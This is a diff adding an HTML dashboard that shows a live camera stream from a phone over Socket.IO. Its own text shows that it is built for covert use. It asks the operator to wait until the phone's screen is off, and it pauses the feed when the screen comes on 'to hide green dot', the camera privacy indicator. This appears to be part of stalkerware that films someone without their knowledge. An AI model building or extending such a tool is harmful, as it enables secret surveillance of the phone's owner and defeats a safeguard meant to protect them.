@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Live Camera Feed</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    <style>
+        body { background: #111; color: #fff; text-align: center; font-family: Arial; padding: 20px; }
+        #video-feed { max-width: 100%; border: 2px solid #333; display: none; margin-top: 20px; }
+        #status { font-size: 18px; padding: 8px; border-radius: 5px; display: inline-block; }
+        .online { background: #28a745; }
+        .offline { background: #dc3545; }
+    </style>
+</head>
+<body>
+    <h2>Live Feed</h2>
+    <div id="status" class="offline">Waiting...</div>
+    <br>
+    <img id="video-feed" src="" />
+    <div id="placeholder" style="margin-top:20px;">Turn off screen on the phone to start.</div>
+
+    <script>
+        const socket = io('/dashboard');
+        const img = document.getElementById('video-feed');
+        const status = document.getElementById('status');
+        const placeholder = document.getElementById('placeholder');
+
+        socket.on('device_status', function(data) {
+            if (data.status === 'online') {
+                status.innerText = "Streaming Live";
+                status.className = "online";
+            } else {
+                status.innerText = "Paused (Screen ON)";
+                status.className = "offline";
+                img.style.display = 'none';
+                placeholder.style.display = 'block';
+                placeholder.innerText = "Camera paused to hide green dot.";
+            }
+        });
+
+        socket.on('frame', function(data) {
+            img.src = "data:image/jpeg;base64," + data;
+            img.style.display = 'block';
+            placeholder.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
